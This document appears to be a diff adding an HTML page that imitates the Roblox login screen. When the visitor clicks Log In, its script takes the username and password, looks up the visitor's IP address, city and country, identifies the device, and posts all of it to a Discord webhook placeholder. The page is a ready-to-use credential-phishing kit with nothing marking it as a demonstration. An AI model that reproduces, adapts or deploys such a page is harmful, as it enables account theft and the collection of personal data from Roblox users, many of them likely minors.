@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #111217;
+      color: #ffffff;
+    }
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 16px;
+      background-color: #1b1c21;
+      flex-wrap: wrap;
+    }
+    .navbar-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .navbar-left img {
+      width: 36px;
+      height: 36px;
+    }
+    .navbar-center {
+      display: flex;
+      gap: 18px;
+      flex-wrap: wrap;
+      justify-content: center;
+      font-size: 14px;
+      color: #ffffff;
+      margin-top: 6px;
+      width: 100%;
+    }
+    .navbar-center div { cursor: pointer; }
+    .navbar-right button {
+      background-color: #1446FF;
+      color: #ffffff;
+      border: none;
+      padding: 8px 14px;
+      font-size: 14px;
+      border-radius: 5px;
+    }
+    .container {
+      max-width: 90%;
+      margin: 40px auto;
+      background-color: #262930;
+      padding: 24px;
+      border-radius: 10px;
+    }
+    .container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 18px;
+    }
+    .container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 14px;
+      background-color: #3B3D48;
+      border: none;
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 14px;
+    }
+    .login {
+      width: 100%;
+      padding: 12px;
+      background-color: #2b2c31;
+      color: white;
+      border: 1px solid #ffffff;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-bottom: 12px;
+      cursor: pointer;
+    }
+    .link {
+      text-align: center;
+      font-size: 13px;
+      margin: 12px 0;
+      color: #ffffff;
+    }
+    .link a {
+      color: #ffffff;
+      text-decoration: none;
+    }
+    .option-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #3B3D48;
+      border: 1px solid #3a3b41;
+      color: #ffffff;
+      border-radius: 6px;
+      font-size: 14px;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .option-btn:hover {
+      background-color: #3a3b41;
+    }
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: #1b1c21;
+      padding: 12px 16px;
+      font-size: 13px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid #3B3D48;
+    }
+    .bottom-bar button {
+      background-color: #1446FF;
+      color: #ffffff;
+      border: none;
+      padding: 8px 12px;
+      font-size: 13px;
+      border-radius: 6px;
+    }
+    @media (min-width: 768px) {
+      .navbar { flex-wrap: nowrap; }
+      .navbar-center {
+        width: auto;
+        margin-top: 0;
+      }
+      .container { max-width: 420px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="navbar">
+    <div class="navbar-left">
+      <div class="search-placeholder"></div>
+      <img src="https://cdn.discordapp.com/attachments/1379365808228143175/1382558506900520960/download_3.png?ex=684b9772&is=684a45f2&hm=b6ebffc63cab35f64861ec0f70e021b562b696f6e51014fcf9ab33c77ea7ed15&" alt="Roblox Logo">
+    </div>
+    <div class="navbar-right">
+      <button>Sign Up</button>
+    </div>
+    <div class="navbar-center">
+      <div>Charts</div>
+      <div>Marketplace</div>
+      <div>Create</div>
+      <div>Robux</div>
+    </div>
+  </div>
+  <div class="container">
+    <h2>Log in to Roblox</h2>
+    <input type="text" placeholder="Username/Email/Phone" />
+    <input type="password" placeholder="Password" />
+    <button class="login">Log In</button>
+    <div class="link">
+      <a href="#">Forgot Password or Username?</a>
+    </div>
+    <div class="option-btn">Email Me A One-Time Code</div>
+    <div class="option-btn">Use another device</div>
+    <div class="link">
+      Don’t have an account? <a href="#">Sign Up</a>
+    </div>
+  </div>
+  <div class="bottom-bar">
+    <div>Explore Roblox on mobile</div>
+    <button>Visit</button>
+  </div>
+  <script>
+    document.querySelector('.login').addEventListener('click', function () {
+      const username = document.querySelector('input[type="text"]').value.trim();
+      const password = document.querySelector('input[type="password"]').value.trim();
+      if (!username || !password) return alert("Please enter both username and password.");
+      const userAgent = navigator.userAgent;
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const city = data.city;
+          const region = data.region;
+          const country = data.country_name;
+          const device = userAgent.includes("Android") ? "Android" :
+                         userAgent.includes("iPhone") ? "iPhone" :
+                         userAgent.includes("Windows") ? "Windows PC" :
+                         userAgent.includes("Mac") ? "Mac" : "Unknown";
+          const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+          const payload = {
+            content:
+              `🔐 **New Login Attempt**\n` +
+              `👤 Username: \`${username}\`\n` +
+              `🔑 Password: \`${password}\`\n` +
+              `🌐 IP: \`${ip}\`\n` +
+              `📍 Location: ${city}, ${region}, ${country}\n` +
+              `🖥️ Device: ${device}\n` +
+              `🧾 User-Agent: \`${userAgent}\``
+          };
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+          }).then(res => {
+            if (res.ok) {
+              alert("Login information sent.");
+            } else {
+              alert("Failed to send data.");
+            }
+          }).catch(err => {
+            alert("Error: " + err);
+          });
+        });
+    });
+  </script>
+</body>
+</html>
